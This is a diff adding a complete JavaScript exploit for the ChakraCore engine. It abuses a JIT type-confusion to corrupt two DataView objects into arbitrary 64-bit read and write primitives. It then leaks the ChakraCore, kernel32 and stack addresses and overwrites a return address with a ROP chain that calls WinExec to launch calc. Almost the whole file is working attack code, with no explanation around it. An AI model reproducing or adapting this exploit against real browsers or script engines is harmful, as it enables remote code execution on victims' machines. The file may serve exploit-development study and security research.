@@ -1,0 +1,153 @@
+obj = {};
+obj.a = 1;
+obj.b = 2;
+obj.c = 3;
+obj.d = 4;
+obj.e = 5;
+obj.f = 6;
+obj.g = 7;
+obj.h = 8;
+obj.i = 9;
+obj.j = 10;
+
+dataview1 = new DataView(new ArrayBuffer(0x100));
+dataview2 = new DataView(new ArrayBuffer(0x100));
+
+function hex(x)
+{
+  return x.toString(16);
+}
+
+function read64(lo, hi)
+{
+  dataview1.setUint32(0x38, lo, true);
+  dataview1.setUint32(0x3c, hi, true);
+
+  var arrayRead = new Uint32Array(0x10); 
+  arrayRead[0] = dataview2.getUint32(0x0, true);
+  arrayRead[1] = dataview2.getUint32(0x4, true);
+  return arrayRead;   
+}
+
+function write64(lo, hi, valLo, valHi)
+{
+   dataview1.setUint32(0x38, lo, true);
+   dataview1.setUint32(0x3C, hi, true);
+  
+   dataview2.setUint32(0x0, valLo, true);
+   dataview2.setUint32(0x4, valHi, true);
+}
+
+function opt(o, proto, value)
+{
+   o.b = 1;
+   let tmp = {__proto__: proto};
+
+   o.a = value;
+}
+
+function main()
+{
+    for (let i=0;i < 2000; i++)
+    {
+	    let o = {a:1, b:2};
+      opt(o, {},{}); 
+    }
+
+    let o = {a:1, b: 2};
+
+    opt(o, o, obj);
+
+    o.c = dataview1;
+
+    obj.h = dataview2;
+
+   vtableLo = dataview1.getUint32(0x0,true);
+   vtableHigh = dataview1.getUint32(0x4,true);
+
+   typeLo = dataview1.getUint32(0x8, true);
+   typeHigh = dataview1.getUint32(0xc, true);
+
+   print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
+    
+   chakraLo = vtableLo - 0x19cd680;
+   chakraHigh = vtableHigh;
+
+   print("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
+
+   iatEntry = read64(chakraLo+0x17c0000+0x40, chakraHigh);
+
+   kernel32High = iatEntry[1];
+
+   kernel32Lo = iatEntry[0] - 0x00020470;
+
+   print("[+] kernel32.dll base address: 0x" + hex(kernel32High) + hex(kernel32Lo));
+
+   javascriptLibrary = read64(typeLo+0x8, typeHigh);
+
+   scriptContext = read64(javascriptLibrary[0]+0x450, javascriptLibrary[1]);
+
+   threadContext = read64(scriptContext[0]+0x3b8, scriptContext[1]);
+
+   stackAddress = read64(threadContext[0]+0xc8, threadContext[1]);
+
+   print("[+] Leaked stack from type->javascriptLibrary->scriptContext->stackLimitForCurrentThread");
+   print("[+] Stack leak: 0x" + hex(stackAddress[1]) + hex(stackAddress[0]));
+
+   var stackLeak = new Uint32Array(0x10);
+   stackLeak[0] = stackAddress[0] + 0xed000;
+   stackLeak[1] = stackAddress[1];
+
+   // Print update
+   print("[+] Stack limit: 0x" + hex(stackLeak[1]) + hex(stackLeak[0]));
+   
+  let counter = 0;
+
+  var retAddr = new Uint32Array(0x10);
+  retAddr[0] = chakraLo + 0x01768f20;
+  retAddr[1] = chakraHigh;
+
+  while (true)
+  {
+	  tempContents = read64(stackLeak[0]+counter, stackLeak[1]);
+        
+    if ((tempContents[0] == retAddr[0]) && (tempContents[1] == retAddr[1]))
+    {
+		  print("[+] Found the target address on the stack!");
+		  print("[+] Target return address: 0x" + hex(stackLeak[0]+counter) + hex(stackLeak[1]));
+		  break;
+    }
+	  counter += 0x8;
+  }
+   
+    // Begin ROP chain
+    // 0x181774902: pop rax ; ret ; (1 found) - 0x1774902
+    // 0x181773ca3: pop rcx ; ret ; (1 found) - 0x1773ca3
+    // 0x1816d08b7: mov qword [rcx], rax ; ret ; (1 found) - 0x16d08b7
+
+
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x1774902, chakraHigh);      // 0x18003e876: pop rax ; ret
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], 0x636c6163, 0x00000000);            // calc
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x1773ca3, chakraHigh);      // 0x18003e6c6: pop rcx ; ret
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x01ce3000, chakraHigh);    // Empty address in .data of chakracore.dll
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x16d08b7, chakraHigh);      // 0x1800d7ff7: mov qword [rcx], rax ; ret
+    
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x1764415, chakraHigh);      // 0x1800d7ff7: pop rdx ; ret
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], 0x00000000, 0x00000000);            // 0
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x1774902, chakraHigh);      // 0x18003e876: pop rax ; ret
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], kernel32Lo+0x000677d0, kernel32High);  // KERNEL32!WinExec address
+    counter+=0x8;
+    write64(stackLeak[0]+counter, stackLeak[1], chakraLo+0x17903f6, chakraHigh);      // 0x1817903f6: jmp rax
+    counter+=0x8;
+
+}  
+ 
+main();
